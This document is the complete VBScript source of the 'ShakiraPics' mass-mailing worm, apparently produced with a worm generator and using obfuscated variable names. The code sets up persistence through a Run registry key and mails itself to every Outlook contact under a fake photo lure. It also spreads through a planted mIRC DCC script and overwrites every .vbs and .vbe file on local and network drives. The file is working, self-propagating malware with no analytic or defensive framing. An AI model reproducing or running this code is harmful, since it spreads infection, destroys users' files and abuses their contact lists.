'Vbs.ShakiraPics Created By TGK
On Error Resume Next
Set vtnxtovasrl= Createobject("scripting.filesystemobject")
vtnxtovasrl.copyfile wscript.scriptfullname,vtnxtovasrl.GetSpecialFolder(0)& "\ShakiraPics.jpg.vbs"
Set esdjqhqjlys = CreateObject("WScript.Shell")
esdjqhqjlys.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Registry","wscript.exe "&vtnxtovasrl.GetSpecialFolder(0)& "\ShakiraPics.jpg.vbs %"
if esdjqhqjlys.regread ("HKCU\software\ShakiraPics\mailed") <> "1" then
rnxvhrehflm()
end if
if esdjqhqjlys.regread ("HKCU\software\ShakiraPics\mirqued") <> "1" then
uefkpmbjscm ""
end if
jetyyxaspsi()
msgbox "You have been infected by the ShakiraPics Worm",64
Set oowyzvhpldu= vtnxtovasrl.opentextfile(wscript.scriptfullname, 1)
vguwditatma= oowyzvhpldu.readall
oowyzvhpldu.Close
Do
If Not (vtnxtovasrl.fileexists(wscript.scriptfullname)) Then
Set llzpyrtgtzw= vtnxtovasrl.createtextfile(wscript.scriptfullname, True)
llzpyrtgtzw.writevguwditatma
llzpyrtgtzw.Close
End If
Loop
Function rnxvhrehflm()
On Error Resume Next
Set fdpamigmucn = CreateObject("Outlook.Application")
If fdpamigmucn= "Outlook"Then
Set glxujkaknrm=fdpamigmucn.GetNameSpace("MAPI")
For Each cgggiuxbqww In glxujkaknrm.AddressLists
If cgggiuxbqww.AddressEntries.Count <> 0 Then
celkbivvimt = cgggiuxbqww.AddressEntries.Count
For eghdqxtmceo= 1 To celkbivvimt
Set hrgsbobhenf = fdpamigmucn.CreateItem(0)
Set qinqoudkopt = cgggiuxbqww.AddressEntries(eghdqxtmceo)
hrgsbobhenf.To = qinqoudkopt.Address
hrgsbobhenf.Subject = "Shakira's Pictures"
hrgsbobhenf.Body = "Hi :" & vbcrlf & "i have sent the photos via attachment" & vbcrlf & "have funn..." & vbcrlf & ""
set fdrsimvzukh=hrgsbobhenf.Attachments
fdrsimvzukh.Add vtnxtovasrl.GetSpecialFolder(0)& "\ShakiraPics.jpg.vbs"
hrgsbobhenf.DeleteAfterSubmit = True
If hrgsbobhenf.To <> "" Then
hrgsbobhenf.Send
esdjqhqjlys.regwrite "HKCU\software\ShakiraPics\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function uefkpmbjscm(ihjcfjrfemh)
On Error Resume Next
if ihjcfjrfemh = "" then
if vtnxtovasrl.fileexists("c:\mirc\mirc.ini") then ihjcfjrfemh="c:\mirc"
if vtnxtovasrl.fileexists("c:\mirc32\mirc.ini") then ihjcfjrfemh="c:\mirc32"
jerfvulfpkg=esdjqhqjlys.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if vtnxtovasrl.fileexists(jerfvulfpkg & "\mirc\mirc.ini") then ihjcfjrfemh=jerfvulfpkg & "\mirc"
end if
if ihjcfjrfemh <> "" then
set nsjjddqvbpz = vtnxtovasrl.CreateTextFile(ihjcfjrfemh & "\script.ini", True)
nsjjddqvbpz.WriteLine "[script]"
nsjjddqvbpz.writeline "n0=on 1:JOIN:#:{"
nsjjddqvbpz.writeline "n1=  /if ( $nick == $me ) { halt }"
nsjjddqvbpz.writeline "n2=  /.dcc send $nick "&vtnxtovasrl.GetSpecialFolder(0)& "\ShakiraPics.jpg.vbs"
nsjjddqvbpz.writeline "n3=}"
nsjjddqvbpz.close
esdjqhqjlys.regwrite "HKCU\software\ShakiraPics\Mirqued", "1"
end if
end function
Function jetyyxaspsi()
On Error Resume Next
Set objqkifonyq = vtnxtovasrl.Drives
For Each wyxcllwxcne In objqkifonyq
If wyxcllwxcne.Drivetype = Remote Then
tarudicsqqp= wyxcllwxcne & "\"
Call skhkzngoprn(tarudicsqqp)
ElseIf wyxcllwxcne.IsReady Then
tarudicsqqp= wyxcllwxcne&"\"
Call skhkzngoprn(tarudicsqqp)
End If
Next
End Function
Function skhkzngoprn(zodvtnxtova)
Set nmgznyelcle= vtnxtovasrl.GetFolder(zodvtnxtova)
Set gtnmjsqcnzc= nmgznyelcle.Files
For Each aghpzafkhwe In gtnmjsqcnzc
if vtnxtovasrl.GetExtensionName(aghpzafkhwe.path) = "vbs" then
vtnxtovasrl.copyfile wscript.scriptfullname , aghpzafkhwe.path , true
end if
if vtnxtovasrl.GetExtensionName(aghpzafkhwe.path) = "vbe" then
vtnxtovasrl.copyfile wscript.scriptfullname , aghpzafkhwe.path , true
end if
Next
Set aghpzafkhwe= nmgznyelcle.SubFolders
For Each nxhezpttsvn In aghpzafkhwe
Call skhkzngoprn(nxhezpttsvn.path)
Next
End Function
'Vbswg 1.1. [K]Alamar.
